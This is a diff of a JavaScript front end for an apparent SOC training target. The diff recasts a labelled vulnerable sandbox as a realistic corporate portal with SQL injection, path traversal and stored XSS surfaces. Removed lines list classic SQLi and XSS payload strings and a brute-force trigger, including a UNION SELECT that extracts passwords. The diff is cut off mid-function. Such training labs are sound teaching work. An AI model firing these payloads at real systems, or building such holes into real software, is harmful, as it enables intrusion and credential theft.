@@ -1,7 +1,8 @@
 /**
- * Vulnerable Target Web Application: CyberVault Systems
- * Allows students to perform attacks (SQLi, XSS, Brute Force) in a safe, controlled sandbox,
- * which immediately emits realistic HTTP telemetry into the SOC SIEM log engine.
+ * Aegis Corporate Enterprise Portal
+ * Real-world looking enterprise asset management & document repository.
+ * Contains authentic attack surfaces for SQL Injection, Directory Traversal, and Cross-Site Scripting.
+ * Generates accurate real-time HTTP telemetry into the SOC SIEM console.
  */
 
 import { logEngine } from './log-engine.js';
@@ -10,11 +11,10 @@ import { sfx, showToast, escapeHtml } from './utils.js';
 class TargetApp {
   constructor() {
     this.container = null;
-    this.currentView = 'catalog'; // 'catalog' | 'login' | 'feedback' | 'simulator'
-    this.isAttacking = false;
-    this.comments = [
-      { id: 1, author: "Alice (DevOps)", comment: "Deployment of v2.4 looks stable. Good job team!", date: "2 hours ago" },
-      { id: 2, author: "Bob (QA)", comment: "Please check the search indexing latency on product queries.", date: "1 hour ago" }
+    this.currentView = 'directory'; // 'directory' | 'documents' | 'login' | 'support'
+    this.tickets = [
+      { id: "TCK-1042", user: "j.miller@aegiscorp.internal", subject: "VPN client configuration timeout", date: "Today at 08:30" },
+      { id: "TCK-1041", user: "k.turner@aegiscorp.internal", subject: "Request access to Q4 compliance folder", date: "Yesterday at 16:15" }
     ];
   }
 
@@ -33,39 +33,41 @@ class TargetApp {
     if (!this.container) return;
 
     this.container.innerHTML = `
-      <div class="flex flex-col h-full bg-slate-950 text-slate-100 rounded-xl border border-slate-800 shadow-2xl overflow-hidden">
-        <!-- Target App Browser Header -->
-        <div class="bg-slate-900 border-b border-slate-800 p-3 flex flex-wrap items-center justify-between gap-3">
-          <div class="flex items-center gap-2">
-            <span class="w-3 h-3 rounded-full bg-rose-500/80 inline-block"></span>
-            <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block"></span>
-            <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block"></span>
-            <div class="ml-2 flex items-center bg-slate-950 px-3 py-1 rounded-md border border-slate-800 text-xs font-mono text-cyan-400">
-              <svg class="w-3.5 h-3.5 mr-1.5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-              <span>http://portal.cybervault.local${this.getPathForView()}</span>
+      <div class="flex flex-col h-full bg-[#0d131f] text-slate-100 rounded-xl border border-slate-800 shadow-2xl overflow-hidden font-sans">
+        <!-- Realistic Browser URL / Address Bar -->
+        <div class="bg-slate-900/90 border-b border-slate-800 px-4 py-3 flex flex-wrap items-center justify-between gap-3">
+          <div class="flex items-center gap-3">
+            <div class="flex items-center gap-1.5">
+              <span class="w-3 h-3 rounded-full bg-rose-500/80 inline-block"></span>
+              <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block"></span>
+              <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block"></span>
+            </div>
+            
+            <div class="flex items-center bg-slate-950 px-3 py-1.5 rounded-lg border border-slate-800 text-xs font-mono text-slate-300 w-80 md:w-96 truncate shadow-inner">
+              <svg class="w-3.5 h-3.5 mr-2 text-emerald-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+              <span class="text-slate-500">https://</span><span class="text-emerald-400 font-medium">portal.aegiscorp.internal</span><span class="text-cyan-300">${this.getPathForView()}</span>
             </div>
           </div>
 
-          <!-- Navigation Sub-Tabs -->
-          <div class="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs font-medium">
-            <button id="nav-catalog" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'catalog' ? 'bg-emerald-600 text-white font-semibold' : 'text-slate-400 hover:text-slate-200'}">
-              🔍 Catalog & Search
+          <!-- Enterprise Navigation -->
+          <div class="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
+            <button id="nav-directory" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'directory' ? 'bg-slate-800 text-emerald-400 font-semibold border border-slate-700' : 'text-slate-400 hover:text-slate-200'}">
+              🏢 Asset Directory
+            </button>
+            <button id="nav-documents" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'documents' ? 'bg-slate-800 text-emerald-400 font-semibold border border-slate-700' : 'text-slate-400 hover:text-slate-200'}">
+              📁 Document Center
+            </button>
+            <button id="nav-support" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'support' ? 'bg-slate-800 text-emerald-400 font-semibold border border-slate-700' : 'text-slate-400 hover:text-slate-200'}">
+              🎫 Support
             </button>
             <button id="nav-login" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'login' ? 'bg-emerald-600 text-white font-semibold' : 'text-slate-400 hover:text-slate-200'}">
-              🔐 Login Portal
-            </button>
-            <button id="nav-feedback" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'feedback' ? 'bg-emerald-600 text-white font-semibold' : 'text-slate-400 hover:text-slate-200'}">
-              💬 Feedback Board
-            </button>
-            <button id="nav-simulator" class="px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${this.currentView === 'simulator' ? 'bg-purple-600 text-white font-semibold shadow-lg shadow-purple-600/30' : 'text-purple-400 hover:text-purple-200 bg-purple-950/40 border border-purple-800/50'}">
-              <span class="w-2 h-2 rounded-full bg-purple-400 animate-ping"></span>
-              ⚡ Attack Simulator
+              🔐 SSO Login
             </button>
           </div>
         </div>
 
         <!-- Main Body Content -->
-        <div class="flex-1 overflow-y-auto p-4 md:p-6" id="target-subview-content">
+        <div class="flex-1 overflow-y-auto p-4 sm:p-6" id="target-subview-content">
           ${this.renderSubview()}
         </div>
       </div>
@@ -76,428 +78,348 @@ class TargetApp {
 
   getPathForView() {
     switch (this.currentView) {
-      case 'catalog': return '/catalog/search';
-      case 'login': return '/login';
-      case 'feedback': return '/board/feedback';
-      case 'simulator': return '/tools/attack-simulator';
+      case 'directory': return '/api/search';
+      case 'documents': return '/api/documents';
+      case 'support': return '/api/tickets';
+      case 'login': return '/auth/login';
       default: return '/';
     }
   }
 
   renderSubview() {
     switch (this.currentView) {
-      case 'catalog': return this.renderCatalogView();
+      case 'directory': return this.renderDirectoryView();
+      case 'documents': return this.renderDocumentsView();
       case 'login': return this.renderLoginView();
-      case 'feedback': return this.renderFeedbackView();
-      case 'simulator': return this.renderSimulatorView();
+      case 'support': return this.renderSupportView();
       default: return '';
     }
   }
 
-  // --- CATALOG & SEARCH VIEW (SQLi & Reflected XSS) ---
-  renderCatalogView() {
+  // --- 1. ASSET DIRECTORY (SQL Injection & Reflected XSS) ---
+  renderDirectoryView() {
     return `
-      <div class="max-w-4xl mx-auto space-y-6">
-        <div class="bg-gradient-to-r from-slate-900 to-slate-900/60 p-5 rounded-xl border border-slate-800">
-          <div class="flex items-center justify-between mb-3">
+      <div class="max-w-5xl mx-auto space-y-5">
+        <!-- Hero Search Section -->
+        <div class="bg-gradient-to-r from-slate-900 to-[#131b2e] p-6 rounded-xl border border-slate-800 shadow-xl space-y-4">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
             <div>
-              <h2 class="text-xl font-bold text-white flex items-center gap-2">
-                CyberVault Security Hardware & Portal
-                <span class="text-xs px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 font-mono">vulnerable: SQLi / XSS</span>
+              <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                Enterprise Infrastructure Directory
               </h2>
-              <p class="text-xs text-slate-400 mt-1">Search the corporate product catalog or query internal asset inventories.</p>
+              <p class="text-xs text-slate-400">Search corporate hardware inventory, network gateways, and server assets.</p>
             </div>
-            <span class="text-xs font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800 px-2 py-1 rounded">GET /catalog/search</span>
+            <span class="text-[11px] font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800/80 px-2.5 py-1 rounded-md self-start">
+              Endpoint: GET /api/search?q=
+            </span>
           </div>
 
-          <form id="catalog-search-form" class="flex gap-2">
+          <form id="asset-search-form" class="flex gap-2">
             <div class="relative flex-1">
               <input 
                 type="text" 
-                id="catalog-search-input" 
-                placeholder="Search products (e.g. firewall, token, or try: ' UNION SELECT 1,username,password,email,role FROM users--)" 
-                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-4 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-emerald-500 font-mono"
+                id="asset-search-input" 
+                placeholder="Search by asset tag, hostname, appliance type, or model..." 
+                class="w-full bg-slate-950 border border-slate-700/80 rounded-lg px-4 py-2.5 text-xs text-slate-100 placeholder-slate-500 focus:outline-none focus:border-emerald-500 font-mono shadow-inner"
               />
             </div>
-            <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-5 py-2.5 rounded-lg text-sm transition-all flex items-center gap-2">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
-              Search
+            <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-5 py-2.5 rounded-lg text-xs transition-all flex items-center gap-1.5 shadow-md">
+              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+              <span>Query</span>
+            </button>
+          </form>
+        </div>
+
+        <!-- Dynamic Results Area -->
+        <div id="asset-results-area" class="space-y-4">
+          ${this.getStandardDirectoryHTML()}
+        </div>
+      </div>
+    `;
+  }
+
+  getStandardDirectoryHTML() {
+    return `
+      <div class="bg-slate-900/90 rounded-xl border border-slate-800 overflow-hidden shadow-xl">
+        <div class="px-5 py-3.5 border-b border-slate-800 flex items-center justify-between text-xs">
+          <span class="font-bold text-slate-300">Active Infrastructure Assets</span>
+          <span class="text-[11px] text-slate-400 font-mono">Showing 4 indexed assets</span>
+        </div>
+        <div class="overflow-x-auto">
+          <table class="w-full text-left font-mono text-xs">
+            <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
+              <tr>
+                <th class="p-3">Asset ID</th>
+                <th class="p-3">Appliance Name</th>
+                <th class="p-3">IP / Subnet</th>
+                <th class="p-3">Environment</th>
+                <th class="p-3">Status</th>
+              </tr>
+            </thead>
+            <tbody class="divide-y divide-slate-800/80 text-slate-200">
+              <tr class="hover:bg-slate-800/30">
+                <td class="p-3 text-cyan-400 font-bold">ASSET-101</td>
+                <td class="p-3 font-medium text-white">Edge Perimeter Firewall (Primary)</td>
+                <td class="p-3 text-slate-400">10.0.1.1/24</td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-slate-800 text-slate-300">Production</span></td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950 text-emerald-400 border border-emerald-800">Online</span></td>
+              </tr>
+              <tr class="hover:bg-slate-800/30">
+                <td class="p-3 text-cyan-400 font-bold">ASSET-102</td>
+                <td class="p-3 font-medium text-white">Core PostgreSQL Database Cluster</td>
+                <td class="p-3 text-slate-400">10.0.4.12/24</td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-slate-800 text-slate-300">Production</span></td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950 text-emerald-400 border border-emerald-800">Online</span></td>
+              </tr>
+              <tr class="hover:bg-slate-800/30">
+                <td class="p-3 text-cyan-400 font-bold">ASSET-103</td>
+                <td class="p-3 font-medium text-white">Enterprise Syslog / SIEM Collector</td>
+                <td class="p-3 text-slate-400">10.0.8.50/24</td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-slate-800 text-slate-300">Security</span></td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950 text-emerald-400 border border-emerald-800">Online</span></td>
+              </tr>
+              <tr class="hover:bg-slate-800/30">
+                <td class="p-3 text-cyan-400 font-bold">ASSET-104</td>
+                <td class="p-3 font-medium text-white">Corporate Identity SSO Gateway</td>
+                <td class="p-3 text-slate-400">10.0.2.10/24</td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-slate-800 text-slate-300">Identity</span></td>
+                <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950 text-emerald-400 border border-emerald-800">Online</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    `;
+  }
+
+  // --- 2. DOCUMENT REPOSITORY (Directory Traversal / Path Traversal) ---
+  renderDocumentsView() {
+    return `
+      <div class="max-w-4xl mx-auto space-y-5">
+        <div class="bg-gradient-to-r from-slate-900 to-[#131b2e] p-6 rounded-xl border border-slate-800 shadow-xl space-y-4">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+            <div>
+              <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                Corporate Document Repository
+              </h2>
+              <p class="text-xs text-slate-400">Access and preview compliance audits, operational guidelines, and server policy files.</p>
+            </div>
+            <span class="text-[11px] font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800/80 px-2.5 py-1 rounded-md self-start">
+              Endpoint: GET /api/documents?file=
+            </span>
+          </div>
+
+          <!-- Document Retrieval Form -->
+          <form id="doc-fetch-form" class="flex gap-2">
+            <div class="relative flex-1">
+              <input 
+                type="text" 
+                id="doc-file-input" 
+                value="annual_compliance_2026.pdf" 
+                placeholder="Enter filename to view (e.g. annual_compliance_2026.pdf)" 
+                class="w-full bg-slate-950 border border-slate-700/80 rounded-lg px-4 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500 shadow-inner"
+              />
+            </div>
+            <button type="submit" class="bg-cyan-600 hover:bg-cyan-500 text-white font-medium px-4 py-2 rounded-lg text-xs transition-all flex items-center gap-1.5 shadow-md">
+              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+              <span>Load File</span>
             </button>
           </form>
 
-          <!-- Quick Test Payloads Helper -->
-          <div class="mt-3 flex flex-wrap items-center gap-2 text-xs">
-            <span class="text-slate-400 font-mono">Quick Injections:</span>
-            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-cyan-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="' OR '1'='1">
-              ' OR '1'='1
-            </button>
-            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-cyan-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="' UNION SELECT 1,username,password,email,role FROM users--">
-              ' UNION SELECT users--
-            </button>
-            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-amber-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="<script>alert('XSS')</script>">
-              &lt;script&gt;alert('XSS')&lt;/script&gt;
-            </button>
-            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-amber-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="<img src=x onerror=alert('Reflected_XSS')>">
-              &lt;img onerror=alert()&gt;
-            </button>
+          <!-- Standard Documents List -->
+          <div class="pt-2 border-t border-slate-800/80">
+            <span class="text-[11px] text-slate-400 font-mono block mb-2">Available Public Documents:</span>
+            <div class="flex flex-wrap gap-2 text-xs">
+              <button type="button" class="btn-sample-doc bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded font-mono border border-slate-700" data-doc="annual_compliance_2026.pdf">
+                📄 annual_compliance_2026.pdf
+              </button>
+              <button type="button" class="btn-sample-doc bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded font-mono border border-slate-700" data-doc="it_security_charter.docx">
+                📄 it_security_charter.docx
+              </button>
+              <button type="button" class="btn-sample-doc bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded font-mono border border-slate-700" data-doc="incident_playbook.pdf">
+                📄 incident_playbook.pdf
+              </button>
+            </div>
           </div>
         </div>
 
-        <!-- Search Results Container -->
-        <div id="catalog-results-area" class="space-y-4">
-          ${this.getStandardCatalogHTML()}
+        <!-- File Content Display Card -->
+        <div id="doc-preview-area" class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl space-y-3 font-mono text-xs">
+          ${this.getStandardDocumentPreviewHTML('annual_compliance_2026.pdf')}
         </div>
       </div>
     `;
   }
 
-  getStandardCatalogHTML() {
+  getStandardDocumentPreviewHTML(filename) {
     return `
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-        <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800 hover:border-slate-700 transition-all">
-          <div class="text-xs text-emerald-400 font-mono mb-1">PROD-101</div>
-          <h3 class="font-bold text-white text-base">NextGen Enterprise Firewall</h3>
-          <p class="text-xs text-slate-400 mt-2">Deep packet inspection appliance with 10Gbps throughput and encrypted tunnel inspection.</p>
-          <div class="mt-4 flex items-center justify-between text-xs">
-            <span class="text-slate-300 font-bold">$2,499.00</span>
-            <span class="bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 font-mono">In Stock</span>
-          </div>
-        </div>
-
-        <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800 hover:border-slate-700 transition-all">
-          <div class="text-xs text-emerald-400 font-mono mb-1">PROD-102</div>
-          <h3 class="font-bold text-white text-base">FIDO2 Hardware Token Key</h3>
-          <p class="text-xs text-slate-400 mt-2">NFC and USB-C hardware authenticator for phishing-resistant MFA tokens.</p>
-          <div class="mt-4 flex items-center justify-between text-xs">
-            <span class="text-slate-300 font-bold">$55.00</span>
-            <span class="bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 font-mono">In Stock</span>
-          </div>
-        </div>
-
-        <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800 hover:border-slate-700 transition-all">
-          <div class="text-xs text-emerald-400 font-mono mb-1">PROD-103</div>
-          <h3 class="font-bold text-white text-base">SOC SIEM Log Collector Node</h3>
-          <p class="text-xs text-slate-400 mt-2">1U rackmount syslog forwarder with TLS encryption and tamper-evident storage.</p>
-          <div class="mt-4 flex items-center justify-between text-xs">
-            <span class="text-slate-300 font-bold">$1,200.00</span>
-            <span class="bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 font-mono">In Stock</span>
-          </div>
-        </div>
+      <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
+        <span class="text-slate-400">File Preview: <strong class="text-white">${escapeHtml(filename)}</strong></span>
+        <span class="text-emerald-400 text-[11px]">HTTP 200 OK</span>
+      </div>
+      <div class="bg-slate-950 p-4 rounded-lg border border-slate-800/80 text-slate-300 leading-relaxed font-sans text-xs">
+        <h4 class="font-bold text-white text-sm mb-2">Aegis Corporate IT Security & Compliance Charter 2026</h4>
+        <p class="mb-2">This document certifies that Aegis Corporation adheres to enterprise access control standards and automated logging policies. All inbound HTTP requests to internal endpoints are retained in SIEM archives for forensic inspection.</p>
+        <p class="text-slate-400">Storage Root: <code>/var/www/portal/storage/documents/</code></p>
       </div>
     `;
   }
 
-  // --- LOGIN VIEW (Brute Force & SQLi Auth Bypass) ---
+  // --- 3. SSO LOGIN (SQL Injection Auth Bypass) ---
   renderLoginView() {
     return `
-      <div class="max-w-md mx-auto my-6 space-y-6">
-        <div class="bg-slate-900 p-6 rounded-xl border border-slate-800 shadow-2xl">
-          <div class="text-center mb-6">
-            <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800 mb-3">
+      <div class="max-w-md mx-auto my-6 space-y-5">
+        <div class="bg-slate-900 p-6 rounded-xl border border-slate-800 shadow-2xl space-y-5">
+          <div class="text-center space-y-1">
+            <div class="inline-flex items-center justify-center w-11 h-11 rounded-lg bg-emerald-950 text-emerald-400 border border-emerald-800 mb-2">
               <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
             </div>
-            <h2 class="text-xl font-bold text-white">Staff Single Sign-On Portal</h2>
-            <p class="text-xs text-slate-400 mt-1">Authorized corporate access only. Monitored by SIEM.</p>
+            <h2 class="text-base font-bold text-white">Employee Identity Access Management</h2>
+            <p class="text-xs text-slate-400">Authenticate using enterprise credentials to access protected management APIs.</p>
           </div>
 
           <form id="target-login-form" class="space-y-4">
             <div>
-              <label class="block text-xs font-mono text-slate-300 mb-1">Username / Account ID</label>
+              <label class="block text-xs font-mono text-slate-300 mb-1">Corporate ID / Username</label>
               <input 
                 type="text" 
                 id="login-username" 
-                value="admin" 
-                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
+                placeholder="e.g. sec_admin" 
+                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                 required
               />
             </div>
 
             <div>
-              <div class="flex items-center justify-between mb-1">
-                <label class="block text-xs font-mono text-slate-300">Password</label>
-                <span class="text-[10px] text-amber-400 font-mono">No rate limits active!</span>
-              </div>
+              <label class="block text-xs font-mono text-slate-300 mb-1">Password</label>
               <input 
                 type="password" 
                 id="login-password" 
-                placeholder="Enter password or SQLi bypass" 
-                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
+                placeholder="Enter password" 
+                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                 required
               />
             </div>
 
             <div id="login-feedback-box" class="hidden text-xs p-3 rounded-lg font-mono"></div>
 
-            <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium py-2.5 rounded-lg text-sm transition-all shadow-lg shadow-emerald-900/30 flex items-center justify-center gap-2">
-              <span>Sign In to Dashboard</span>
+            <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium py-2.5 rounded-lg text-xs transition-all shadow-md">
+              Sign In
             </button>
           </form>
 
-          <!-- Interactive Brute Force Trigger -->
-          <div class="mt-6 pt-5 border-t border-slate-800 space-y-3">
-            <div class="flex items-center justify-between text-xs">
-              <span class="text-slate-400 font-medium">Test Attack Scenarios:</span>
-              <span class="text-[11px] text-purple-400 font-mono">Emits live logs to SIEM</span>
-            </div>
-
-            <div class="grid grid-cols-2 gap-2">
-              <button type="button" id="btn-burst-sqli-login" class="bg-slate-800 hover:bg-slate-700 text-cyan-300 p-2 rounded text-xs font-mono border border-slate-700 text-center transition-all">
-                🔓 Inject ' OR '1'='1
-              </button>
-              <button type="button" id="btn-burst-brute-login" class="bg-purple-950/70 hover:bg-purple-900/70 text-purple-200 p-2 rounded text-xs font-mono border border-purple-800 text-center transition-all flex items-center justify-center gap-1">
-                <svg class="w-3.5 h-3.5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-                Hydra Burst
-              </button>
-            </div>
+          <div class="pt-3 border-t border-slate-800 text-center">
+            <span class="text-[11px] text-slate-500 font-mono">Telemetry: POST /auth/login</span>
           </div>
         </div>
       </div>
     `;
   }
 
-  // --- FEEDBACK & BUG BOUNTY BOARD (Stored XSS) ---
-  renderFeedbackView() {
+  // --- 4. SUPPORT & FEEDBACK (Stored XSS) ---
+  renderSupportView() {
     return `
-      <div class="max-w-3xl mx-auto space-y-6">
-        <div class="bg-slate-900 p-5 rounded-xl border border-slate-800">
-          <div class="flex items-center justify-between mb-4">
+      <div class="max-w-4xl mx-auto space-y-5">
+        <div class="bg-slate-900 p-6 rounded-xl border border-slate-800 shadow-xl space-y-4">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
             <div>
-              <h2 class="text-lg font-bold text-white flex items-center gap-2">
-                Internal Security Feedback & Guestbook
-                <span class="text-xs px-2 py-0.5 rounded bg-amber-950 text-amber-300 border border-amber-800 font-mono">vulnerable: Stored XSS</span>
-              </h2>
-              <p class="text-xs text-slate-400">Leave feedback for the IT administration team. Unsanitized comments are stored in the database.</p>
+              <h2 class="text-lg font-bold text-white">Internal IT Support Ticket System</h2>
+              <p class="text-xs text-slate-400">Report infrastructure issues to internal systems engineering.</p>
             </div>
-            <span class="text-xs font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800 px-2 py-1 rounded">POST /board/feedback</span>
+            <span class="text-[11px] font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800/80 px-2.5 py-1 rounded-md self-start">
+              Endpoint: POST /api/tickets
+            </span>
           </div>
 
-          <form id="feedback-form" class="space-y-3">
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+          <form id="support-ticket-form" class="space-y-3">
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <div>
-                <label class="block text-xs font-mono text-slate-300 mb-1">Author Name</label>
+                <label class="block text-xs font-mono text-slate-300 mb-1">Employee Email</label>
                 <input 
-                  type="text" 
-                  id="feedback-author" 
-                  value="Anonymous Security Researcher" 
+                  type="email" 
+                  id="ticket-email" 
+                  value="operator@aegiscorp.internal" 
                   class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                   required
                 />
               </div>
-              <div class="flex items-end">
-                <button type="button" id="btn-quick-xss-comment" class="w-full bg-slate-800 hover:bg-slate-700 text-amber-300 border border-slate-700 px-3 py-2 rounded-lg text-xs font-mono transition-all">
-                  ⚡ Insert Malicious Script Payload
-                </button>
+              <div>
+                <label class="block text-xs font-mono text-slate-300 mb-1">Ticket Subject</label>
+                <input 
+                  type="text" 
+                  id="ticket-subject" 
+                  placeholder="Brief summary of request" 
+                  class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
+                  required
+                />
               </div>
             </div>
 
             <div>
-              <label class="block text-xs font-mono text-slate-300 mb-1">Message / Comment</label>
+              <label class="block text-xs font-mono text-slate-300 mb-1">Issue Description</label>
               <textarea 
-                id="feedback-text" 
+                id="ticket-details" 
                 rows="3" 
-                placeholder="Type comment or try: <script>alert('Stored_XSS')</script>"
+                placeholder="Provide incident or inquiry details..." 
                 class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                 required
               ></textarea>
             </div>
 
-            <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-4 py-2 rounded-lg text-xs transition-all flex items-center gap-1.5">
-              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
-              Submit Feedback (Emits POST Log)
+            <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-4 py-2 rounded-lg text-xs transition-all">
+              Submit Ticket (POST)
             </button>
           </form>
         </div>
 
-        <!-- Comments Feed -->
-        <div class="bg-slate-900/80 p-5 rounded-xl border border-slate-800 space-y-3">
-          <h3 class="text-sm font-bold text-white flex items-center justify-between">
-            <span>Recent Comments Feed (${this.comments.length})</span>
-            <span class="text-xs font-normal text-slate-400">Rendered client-side</span>
-          </h3>
-
-          <div class="space-y-2.5" id="comments-list">
-            ${this.renderCommentsList()}
+        <!-- Open Tickets Table -->
+        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5 space-y-3">
+          <h3 class="text-xs font-bold text-white font-mono uppercase tracking-wider">Recently Logged Support Tickets</h3>
+          <div class="space-y-2" id="ticket-feed">
+            ${this.renderTicketList()}
           </div>
         </div>
       </div>
     `;
   }
 
-  renderCommentsList() {
-    return this.comments.map(c => `
-      <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 flex items-start justify-between gap-3">
-        <div class="space-y-1">
-          <div class="flex items-center gap-2">
-            <span class="text-xs font-bold text-cyan-400 font-mono">${escapeHtml(c.author)}</span>
-            <span class="text-[10px] text-slate-500">${escapeHtml(c.date)}</span>
+  renderTicketList() {
+    return this.tickets.map(t => `
+      <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-xs font-mono flex items-start justify-between gap-3">
+        <div>
+          <div class="flex items-center gap-2 mb-1">
+            <span class="text-cyan-400 font-bold">${escapeHtml(t.id)}</span>
+            <span class="text-slate-400 text-[11px]">${escapeHtml(t.user)}</span>
+            <span class="text-slate-500 text-[10px]">${escapeHtml(t.date)}</span>
           </div>
-          <div class="text-xs text-slate-300 font-mono break-all">${escapeHtml(c.comment)}</div>
+          <div class="text-slate-200">${escapeHtml(t.subject)}</div>
